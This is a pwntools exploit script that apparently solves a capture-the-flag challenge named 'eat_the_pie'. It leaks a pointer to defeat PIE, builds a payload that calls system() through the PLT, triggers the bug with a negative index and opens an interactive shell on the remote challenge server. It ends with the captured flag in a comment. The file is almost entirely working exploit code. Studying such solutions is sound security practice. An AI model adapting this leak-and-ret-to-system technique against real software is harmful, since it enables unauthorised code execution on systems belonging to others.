from pwn import *

e = ELF('./eat_the_pie')
# p = process('./eat_the_pie')
p = remote('eat-the-pie.sstf.site',1337)

p.sendafter('>','A'*16)
p.sendafter('>','4')
p.recvuntil('A'*15)
pie_base = u32(p.recv(4)) - 1869
log.info(hex(pie_base))

pay = 'a'*4+p32(pie_base+e.plt['system'])+p32(pie_base + 0x00000a99)+p32(pie_base+0x31a)
p.sendafter('>',pay)

p.sendafter('>','-2') # trigger

p.interactive()

# SCTF{P3c4n_P1E_I5_V3ry_vee33e3Ry_d3l1c10u5}
